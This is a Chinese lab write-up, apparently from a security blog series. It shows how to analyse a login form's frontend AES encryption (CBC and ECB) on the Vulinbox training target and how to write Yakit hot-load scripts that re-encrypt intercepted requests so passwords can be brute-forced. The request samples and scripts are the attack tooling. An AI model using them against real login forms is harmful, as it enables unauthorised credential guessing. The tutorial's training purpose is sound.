[合集 \- 高级前端加解密与验签实战(3\)](https://github.com)[1\.渗透测试\-前端验签绕过之SHA25612\-14](https://github.com/CVE-Lemon/p/18606207)[2\.渗透测试\-前端验签绕过之SHA256\+RSA12\-14](https://github.com/CVE-Lemon/p/18606915)3\.渗透测试\-前端加密分析之AES12\-15收起
# 前言


本文是高级前端加解密与验签实战的第3篇文章，本系列文章实验靶场为Yakit里自带的Vulinbox靶场，本文讲述的是绕过前端 AES(CBC) 和 AES(ECB) 加密。


因为编写Yakit热加载代码后就可以正常爆破密码，所以不需要每次都演示。以后的文章会省略掉爆破密码这一步，直接输入正确密码查看效果。


# 前端加密登录表单\-AES(CBC)


## 分析


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014336824-2051997129.png)


查看源代码，可以看到加密方式为AES，查询网上资料得知，此encrypt方法默认为CBC模式。


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014338787-608965049.png)


key为：`1234123412341234`


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014341166-1037827622.png)


iv为随机生成的：


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014343585-751910180.png)


将用户名和密码以json的格式进行AES加密


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014345953-75173403.png)


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014349031-301610679.png)


使用CyberChef加密


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014351862-2105453092.png)


替换请求data内容，验证成功。



```
POST /crypto/js/lib/aes/cbc/handler HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json
Content-Length: 169

{
  "data": "2/eylw258wQNJQznPd5zr7xpNWzPR3vcgCmY3zwuTdW0WjSwbNzAhTraiebLdPRK",
  "key": "31323334313233343132333431323334",
  "iv": "67ba30beaabf8ccfebeca655d487805a"
}

```

![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014355830-557569038.png)


## 热加载


这是本人写的Yakit热加载代码，通过`beforeRequest`劫持请求包，使用`encryptData`函数进行加密，最终实现热加载自动加密功能。



```
encryptData = (packet) => {
    body = poc.GetHTTPPacketBody(packet)

    hexKey = "31323334313233343132333431323334"
    hexIV = "67ba30beaabf8ccfebeca655d487805a"
    key = codec.DecodeHex(hexKey)~
    iv = codec.DecodeHex(hexIV)~

    data = codec.AESCBCEncrypt(key /*type: []byte*/, body, iv /*type: []byte*/)~
    data = codec.EncodeBase64(data)

    body = f`{"data": "${data}","key": "${hexKey}","iv": "${hexIV}"}`
    return string(poc.ReplaceBody(packet, body, false))
}

//发送到服务端修改数据包
beforeRequest = func(req){
    return encryptData(req)
}

```

![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014359762-1854724716.png)


效果：


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014406498-1138827595.png)


# 前端加密登录表单\-AES(ECB)


## 分析


模式变为AES的ECB模式，其他的与CBC模式基本一样。


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014413034-122924669.png)



```
zqBATwKGlf9ObCg8Deimijp+OH1VePy6KkhV1Z4xjiDwOuboF7GPuQBCJKx6o9c7

```

![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014414823-1198823420.png)


## 热加载


功能跟上面大致一样。ECB模式不需要iv，修改成ECB加密，然后删除掉iv相关代码即可。



```
encryptData = (packet) => {
    body = poc.GetHTTPPacketBody(packet)

    hexKey = "31323334313233343132333431323334"
    key = codec.DecodeHex(hexKey)~

    //ECB模式加密
    data = codec.AESECBEncrypt(key /*type: []byte*/, body, nil /*type: []byte*/)~
    data = codec.EncodeBase64(data)

    body = f`{"data": "${data}","key": "${hexKey}"}`
    return string(poc.ReplaceBody(packet, body, false))
}

//发送到服务端修改数据包
// beforeRequest = func(req){
//     return encryptData(req)
// }

//调试用
packet = <<
```

成功加密


![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014423335-1737486920.png)


 \_\_EOF\_\_

       - **本文作者：** [柠檬i](https://github.com)
 - **本文链接：** [https://github.com/CVE\-Lemon/p/18607483](https://github.com):[slower加速器官网](https://chundaotian.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
